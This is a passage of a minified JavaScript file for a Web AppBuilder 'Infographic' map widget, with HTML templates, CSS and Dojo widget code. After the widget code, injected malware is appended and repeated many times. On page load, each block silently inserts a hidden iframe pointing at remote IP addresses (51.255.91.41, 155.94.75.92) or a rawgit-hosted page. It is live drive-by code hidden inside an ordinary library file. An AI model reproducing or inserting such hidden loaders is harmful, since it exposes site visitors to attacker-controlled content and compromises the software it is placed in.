textOverFlow" title\x3d"${nls.verticalAxis}"\x3e${nls.verticalAxis}\x3c/div\x3e\r\n    \x3cdiv data-dojo-attach-point\x3d"verticalAxisToggle" data-dojo-attach-event\x3d"onclick:_onToggleClick" class\x3d"jimu-leading-margin10 toggle toggle-off" data-id\x3d"verticalAxis"\x3e\x3c/div\x3e\r\n  \x3c/div\x3e\r\n\r\n   \x3cdiv class\x3d"flex section" data-dojo-attach-point\x3d"withoutRecordsSection"\x3e\r\n    \x3cdiv class\x3d"label textOverFlow" title\x3d"${nls.showPeriodsWithoutRecords}"\x3e${nls.showPeriodsWithoutRecords}\x3c/div\x3e\r\n    \x3cdiv data-dojo-attach-point\x3d"withoutRecordsToggle" data-dojo-attach-event\x3d"onclick:_onToggleClick" class\x3d"jimu-leading-margin10 toggle toggle-off" data-id\x3d"withoutRecords"\x3e\x3c/div\x3e\r\n  \x3c/div\x3e\r\n\r\n\x3c/div\x3e',
"url:widgets/Infographic/Widget.html":'\x3cdiv style\x3d"width: 100%;height: 100%;"\x3e\r\n\x3c/div\x3e',"url:widgets/Infographic/css/style.css":'@font-face {font-family: \'icomoon\'; src: url("fonts/icomoon.eot?oflavm"); src: url("fonts/icomoon.eot?oflavm#iefix") format(\'embedded-opentype\'), url("fonts/icomoon.ttf?oflavm") format(\'truetype\'), url("fonts/icomoon.woff?oflavm") format(\'woff\'), url("fonts/icomoon.svg?oflavm#icomoon") format(\'svg\'); font-weight: normal; font-style: normal;}.jimu-widget-infographic .indicator-icon,.jimu-widget-infographic-setting .indicator-icon {font-family: \'icomoon\' !important; speak: none; font-style: normal; font-weight: normal; font-variant: normal; text-transform: none; line-height: 1; -webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale;}.icon-like:before {content: "\\e900";}.icon-unlike:before {content: "\\e904";}.icon-stop:before {content: "\\e902";}.icon-danger:before {content: "\\e901";}.icon-star:before {content: "\\e903";}.icon-alarm:before {content: "\\e906";}.icon-down:before {content: "\\e909";}.icon-right:before {content: "\\e90f";}.icon-up:before {content: "\\e911";}.icon-wrong:before {content: "\\e912";}.lm_goldenlayout .lm_item .lm_content {position: relative;}.lm_goldenlayout .lm_item .lm_content .table-layout-container {display: table; table-layout: fixed; overflow: hidden; width: 100%; height: 100%;}.lm_goldenlayout .lm_item .lm_content .table-layout-container \x3e div {padding: 10px 15px;}.lm_goldenlayout .lm_item .lm_content .image-node {display: table-cell; overflow: hidden; position: relative; width: 100%; height: 100%;}.lm_goldenlayout .lm_item .lm_content .no-trim {white-space: pre-wrap;}.infographic-number-dijit {display: flex; justify-content: center; align-items: center;}.infographic-number-dijit .number-content .value-content {white-space: nowrap;}.infographic-number-dijit a,.infographic-number-dijit a:hover,.infographic-number-dijit a:visited,.infographic-number-dijit a:link,.infographic-number-dijit a:active {text-decoration: none;}.infographic-number-dijit.horizontal-left {justify-content: flex-start;}.infographic-number-dijit.horizontal-center {justify-content: center;}.infographic-number-dijit.horizontal-right {justify-content: flex-end;}.infographic-number-dijit.vertical-top {align-items: flex-start;}.infographic-number-dijit.vertical-middle {align-items: center;}.infographic-number-dijit.vertical-bottom {align-items: flex-end;}.infographic-number-dijit .number-content {display: flex; justify-content: center; max-width: 340px;}.infographic-number-dijit .number {display: flex; justify-content: space-between; align-items: baseline;}.infographic-number-dijit .indicator-icon {font-size: 22px; align-self: center; text-align: center;}.infographic-number-dijit .number .prefix {margin-right: 6px;}.infographic-number-dijit .number .suffix {margin-left: 6px;}.infographic-number-dijit .rightImgDiv {width: 35%; height: 100%; text-align: left;}.infographic-chart-dijit {position: relative;}.infographic-chart-dijit .no-data-tip {display: none; position: absolute; left: 0; right: 0; height: 30px; top: 50%; margin: -15px; text-align: center; color: #666;}.infographic-chart-dijit.no-data .no-data-tip {display: block; margin: 0 10px;}.infographic-chart-dijit.no-data .chart-dom {visibility: hidden;}.infographic-chart-dijit .chart-dom {visibility: visible;}.jimu-widget-infographic {position: relative; width: 100%; height: 100%;}.jimu-widget-infographic .chart-setting {position: absolute; top: 0; right: 0; cursor: pointer; width: 16px; height: 16px; background: no-repeat center center url(images/chart-setting.svg); z-index: 1;}.ig-chart-setting-dlg .jimu-leading-margin10 {margin-left: 10px; margin-right: 0;}.jimu-rtl .ig-chart-setting-dlg .jimu-leading-margin10 {margin-right: 10px; margin-left: 0;}.ig-chart-setting-dlg .textOverFlow {white-space: nowrap; overflow: hidden; text-overflow: ellipsis;}.ig-chart-setting-dlg .flex {display: flex; justify-content: space-between; margin-top: 8px;}.ig-chart-setting-dlg .label {width: 120px;}.ig-chart-setting-dlg .toggle {width: 38px; height: 18px; cursor: pointer;}.ig-chart-setting-dlg .toggle.toggle-on {background: no-repeat center left url(./images/toggle_on_light.svg);}.ig-chart-setting-dlg .toggle.toggle-off {background: no-repeat center left url(./images/toggle_off_light.svg);}',
"*now":function(n){n(['dojo/i18n!*preload*widgets/Infographic/nls/Widget*["ar","bs","cs","da","de","en","el","es","et","fi","fr","he","hi","hr","id","it","ja","ko","lt","lv","nb","nl","pl","pt-br","pt-pt","ro","ru","sl","sr","sv","th","tr","zh-cn","vi","zh-hk","zh-tw","ROOT"]'])},"*noref":1}});
define("dojo/_base/declare dojo/_base/lang dojo/_base/array dojo/_base/html dojo/on dijit/_WidgetsInTemplateMixin dijit/popup dijit/TooltipDialog jimu/BaseWidget jimu/dijit/GridLayout jimu/DataSourceManager jimu/LayerInfos/LayerInfos jimu/utils ./DijitFactory ./dijits/utils ./_ChartSetting".split(" "),function(n,k,f,c,a,b,p,g,m,l,d,h,e,q,t,w){return n([m,b],{name:"Infographic",baseClass:"jimu-widget-infographic",dijits:null,clientFeaturesHandle:null,layerInfosObj:null,postCreate:function(){this.inherited(arguments);
this.dijits=[];this.layerInfosObj=h.getInstanceSync();q.setNls(this.nls);q.setMap(this.map);q.setInSettingPage(!1);q.setAppConfig(this.appConfig);q.setContext({folderUrl:this.folderUrl});this.on("click",k.hitch(this,function(){this.chartSettingDialog&&p.close(this.chartSettingDialog)}));this._features=[]},startup:function(){this.inherited(arguments);this._createUI();this._createChartSettingBtn()},onOpen:function(){if(this.config.dataSource)if("DATA_SOURCE_FEATURE_LAYER_FROM_MAP"===this.config.dataSource.dataSourceType){var a=
this.layerInfosObj.getLayerInfoById(this.config.dataSource.layerId);a&&a.getLayerObject().then(k.hitch(this,function(a){a&&(this.clientFeaturesHandle=t.listenClientFeaturesFromMap(this.map,a,this.config.dataSource.useSelection,this.config.dataSource.filterByExtent,k.hitch(this,this._onClientFeaturesUpdate)))}))}else"DATA_SOURCE_FROM_FRAMEWORK"===this.config.dataSource.dataSourceType&&(a=d.getInstance().getData(this.config.dataSource.frameWorkDsId))&&this._onDataUpdate(a)},onClose:function(){this._releaseHanlde();
this.chartSettingDialog&&this.chartSettingDialog.isShow&&(p.close(this.chartSettingDialog),this.chartSettingDialog.isShow=!1)},destroy:function(){this._releaseHanlde();this.chartSettingDialog&&(this.chartSettingDialog.destroy(),this.chartSettingDialog=null);this.inherited(arguments)},_releaseHanlde:function(){this.clientFeaturesHandle&&this.clientFeaturesHandle.remove();this.clientFeaturesHandle=null},_createUI:function(){if(this.config.layout){f.forEach(this.dijits,k.hitch(this,function(a){a.destroy()}));
this.dijits=[];var a=f.map(this.config.dijits,function(a){var b=q.createDijit(a);b.setDataSource(this.config.dataSource);this.dijits.push(b);return{id:a.id,dijit:b}},this);this.layout=new l({components:a,layoutDefinition:this.config.layout.definition,container:this.domNode,editable:!1});this.layout.on("initialised",k.hitch(this,function(){f.forEach(this.dijits,k.hitch(this,function(a){a.startup()}))}))}},_createChartSettingBtn:function(){this.config.dijits&&f.some(this.config.dijits,function(a){return a.visible&&
"chart"===a.type},this)&&(this.chartSettingNode=c.create("div",{"class":"chart-setting"},this.domNode),this.own(a(this.chartSettingNode,"click",k.hitch(this,this._onChartSettingClick))),this.chartSettingDialog=new g({content:this._createChartSettingContent()}),this.chartSettingDialog.isShow=!1)},_onChartSettingClick:function(a){this.chartSettingDialog.isShow?(p.close(this.chartSettingDialog),this.chartSettingDialog.isShow=!1):(p.open({popup:this.chartSettingDialog,around:this.chartSettingNode}),this.chartSettingDialog.isShow=
!0);a.stopPropagation()},_createChartSettingContent:function(){var a=f.filter(this.config.dijits,function(a){return"chart"===a.type})[0];return a?a.config?(new w({chartJson:a,chartDijit:f.filter(this.dijits,function(b){return b.jsonId===a.id})[0],nls:this.nls})).domNode:"\x3cdiv\x3e\x3c/div\x3e":(console.error("Unknow error"),"\x3cdiv\x3e\x3c/div\x3e")},onDataSourceDataUpdate:function(a,b){this.config.dataSource&&a===this.config.dataSource.frameWorkDsId&&(b.features=t.filterFeaturesByDataSourceSetting(b.features,
this.config.dataSource,this.map),this._onDataUpdate(b))},_onClientFeaturesUpdate:function(a){this._onDataUpdate({features:a})},_onDataUpdate:function(a){var b=f.map(this._features,function(a){return a.attributes}),c=f.map(a.features,function(a){return a.attributes});e.isEqual(b,c)||(this._features=a.features,f.forEach(this.dijits,k.hitch(this,function(b){b.onDataSourceDataUpdate(a)})))},resize:function(){this.inherited(arguments);this.layout&&this.layout.resize()}})});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});